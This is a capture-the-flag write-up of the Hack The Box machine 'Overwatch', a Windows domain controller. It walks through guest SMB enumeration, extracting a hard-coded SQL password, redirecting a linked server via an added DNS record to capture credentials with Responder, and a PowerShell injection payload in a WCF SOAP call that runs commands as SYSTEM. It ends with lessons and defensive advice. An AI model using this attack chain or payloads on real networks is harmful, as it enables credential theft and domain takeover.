# Overwatch — Hack The Box, Medium, Windows / Active Directory

*Flags redacted. Machine address generalised to `10.129.x.x` and the attacker
host to `10.10.14.x`.*

**TL;DR:** An enabled Guest account reads an SMB share holding an in-house .NET
monitoring tool; the tool has a hard-coded SQL/domain password; that account can
create the missing DNS record for a SQL linked server, redirect its login to a
rogue MSSQL server, and capture a second cleartext credential that grants WinRM;
and the same tool exposes a WCF `KillProcess` operation that runs caller input
through `PowerShell.AddScript` **as SYSTEM** on the domain controller.

## Reconnaissance

The host is a domain controller — the full AD port set is open — with one thing
out of place:

    nmap -Pn -p- --min-rate 3000 10.129.x.x
    53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389   # textbook DC
    6520/tcp open                                                 # not textbook

    nmap -sCV -p6520 10.129.x.x
    6520/tcp open  ms-sql-s  Microsoft SQL Server 2022 16.00.1000.00; RTM

A SQL Server on a non-standard port, on an otherwise hardened DC, is the loudest
signal on the box. My local methodology has a rule for exactly this: *on a
locked-down host the one non-standard port is the path.* So MSSQL went to the top
of the queue — but it needed a credential first.

## Enumeration

SMB answered anonymously (`Null Auth: True`). Guest turned out to be enabled, and
it had more than the defaults:

    nxc smb 10.129.x.x -u guest -p '' --shares
    IPC$        READ
    NETLOGON
    software$   READ          # non-default
    SYSVOL

    nxc smb 10.129.x.x -u guest -p '' --rid-brute   # 111 domain users, incl. sqlsvc, sqlmgmt

`software$\Monitoring\` held a compiled in-house app shipped with its **PDB** —
`overwatch.exe`, `overwatch.pdb`, and a SQLite + EntityFramework + SQL Server
stack. The `.exe.config` described a WCF service (`http://overwatch.htb:8000/
MonitorService`). A .NET binary this small is worth reading rather than running.

The connection string is in the assembly. `ikdasm` truncated the literal at 49
chars (a known trap — the IL string table shows only `...User Id=sql`), so I
pulled the UTF-16 string heap directly:

    strings -el overwatch.exe | grep -i password
    Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;

`sqlsvc` was not just a local SQL login — it authenticated as a **domain** account
on SMB, LDAP, MSSQL and RDP (WinRM denied). No AS-REP-roastable users, no SPNs to
Kerberoast — so the value of `sqlsvc` was the MSSQL access it gave.

## Foothold

On MSSQL, `sqlsvc` is only `guest` in `master` (not sysadmin), but enumerating
linked servers paid off:

    SQL> enum_links
    SQL07     SQLNCLI   SQL Server   SQL07

`SQL07` does not resolve — `sql07.overwatch.htb` was NXDOMAIN. That is the whole
trick: the DC runs an AD-integrated DNS zone, and the default ACL lets *any*
authenticated user create a new record. `sqlsvc` qualifies:

    bloodyAD --host 10.129.x.x -d overwatch.htb -u sqlsvc -p TI0LKcfHzZw1Vv \
        add dnsRecord sql07 10.10.14.x
    dig @10.129.x.x sql07.overwatch.htb +short
    10.10.14.x                       # now points at me

Stand up a rogue MSSQL listener (Responder does this out of the box) and force the
linked-server login:

    SQL> EXEC ('SELECT 1') AT [SQL07];

The linked server uses **SQL authentication**, and MSSQL sends that password in a
form Responder logs verbatim:

    [MSSQL] Cleartext Username : sqlmgmt
    [MSSQL] Cleartext Password : bIhBbzMMnB82yx

`sqlmgmt` is in **Remote Management Users**, so unlike `sqlsvc` it gets a shell:

    nxc winrm 10.129.x.x -u sqlmgmt -p bIhBbzMMnB82yx
    (Pwn3d!)

    PS> Get-Content C:\Users\sqlmgmt\Desktop\user.txt
    <redacted>

## Privilege escalation

`sqlmgmt` is a plain user (no `SeImpersonate`, medium integrity). But `netstat`
showed the monitoring app itself listening locally:

    TCP  [::]:8000   LISTENING   <overwatch.exe>

Back to the disassembly. The WCF contract has three operations — and `KillProcess`
is the one that matters:

    // IL of KillProcess(string processName)
    ldstr "Stop-Process -Name "
    ldarg.1
    ldstr " -Force"
    call String::Concat(...)            // "Stop-Process -Name " + processName + " -Force"
    ...
    callvirt Pipeline::CreatePipeline()
    callvirt CommandCollection::AddScript(string)   // <-- the concatenated string, as a SCRIPT
    callvirt Pipeline::Invoke()

`AddScript` runs the whole concatenated string as PowerShell, and the pipeline
output is returned in the SOAP response (`KillProcessResult`) — a synchronous
oracle, no reverse shell needed. `processName` is entirely attacker-controlled, so
I break out of the `Stop-Process` and append my own command, commenting out the
trailing ` -Force` with `#`:

    processName = "nope -Force; whoami ;#"

Sent as a SOAP `KillProcess` call to `http://overwatch.htb:8000/MonitorService`
from the WinRM shell (the port is local-only):

    <tem:KillProcess><tem:processName>nope -Force; whoami ;#</tem:processName></tem:KillProcess>

    KillProcessResult:  nt authority\system

The service runs as **SYSTEM**. From there, root is a `type`:

    processName = "nope -Force; type C:\Users\Administrator\Desktop\root.txt ;#"

    KillProcessResult:  <redacted>

SYSTEM on the DC is domain compromise; the flags were the only objective, so I
stopped short of dumping NTDS.

## What did not work

- **AS-REP roast / Kerberoast.** All 111 users enumerated, sprayed through the
  Kerberos pre-auth oracle — no account had pre-auth disabled and no SPNs existed.
  A dead end worth ruling out early because it costs one command.
- **`sqlsvc` as a shell.** It authenticates everywhere *except* WinRM — an
  authorization limit, not a wrong password. Easy to misread as a bad credential
  if WinRM is the only thing you try; the answer was a *different* account.
- **`xp_cmdshell` / MSSQL RCE directly.** `sqlsvc` is only `guest`, not sysadmin,
  so the usual MSSQL-to-shell path was closed. The linked server, not the local
  instance, was the lever.

## Lessons

- A **linked server whose target hostname does not resolve**, on a domain where
  you can write DNS, is a credential-capture primitive: point the name at
  yourself and let the server log in to you. SQL-auth linked servers hand over
  the password in cleartext.
- When a lab box ships a **custom binary with its PDB**, read it before you run
  it — and read the *string heap* (`strings -el` for .NET), because IL
  disassemblers truncate long literals and hide exactly the secret you want.
- Any managed service that builds a command with `Pipeline.AddScript(base + input)`
  is script injection, not a "kill process" feature — the give-away in IL is
  `String::Concat` feeding `AddScript`.

## Defensive takeaway

The earliest cheap break is the credential hygiene pair: a monitoring tool on a DC
should hold **no plaintext secret** and should use **Kerberos, not a stored SQL
login**, for its linked server — that removes both the first credential and the
pivot that produced WinRM. But the control with the widest blast-radius reduction
is simply **not running that service as SYSTEM on a domain controller**: even with
every injection bug left in place, a least-privileged service account turns a
domain-owning finding into a low-impact one.
